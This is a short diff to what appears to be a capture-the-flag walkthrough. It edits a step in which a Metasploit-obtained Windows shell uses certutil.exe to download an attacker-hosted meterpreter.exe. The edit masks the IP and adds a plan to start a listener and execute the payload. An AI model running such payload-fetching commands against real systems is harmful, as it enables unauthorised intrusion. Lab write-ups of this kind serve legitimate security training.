@@ -592,8 +592,8 @@ Let's go back to the regular shell and download our hosted `meterpreter.exe`. We
 msf5 > sessions -i 1
 [*] Starting interaction with 1...
 
-C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
-certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.x.x:80/meterpreter.exe" meterpreter.exe
+certutil.exe -urlcache -split -f "http://10.10.x.x:80/meterpreter.exe" meterpreter.exe
 ****  Online  ****
   0000  ...
   1c00
@@ -613,4 +613,9 @@ dir
                2 File(s)        767.488 bytes
                2 Dir(s)  31.897.223.168 bytes free
 ```
-We got our payload in successfully! However, the original flag is gone. Some guy must have deleted it.
+We got our payload in successfully! However, the original flag is gone. Some guy must have deleted it. Let's just ignore that for now.
+
+Time to run another listener, and execute the `meterpreter.exe` payload we inserted.
+```
+
+```
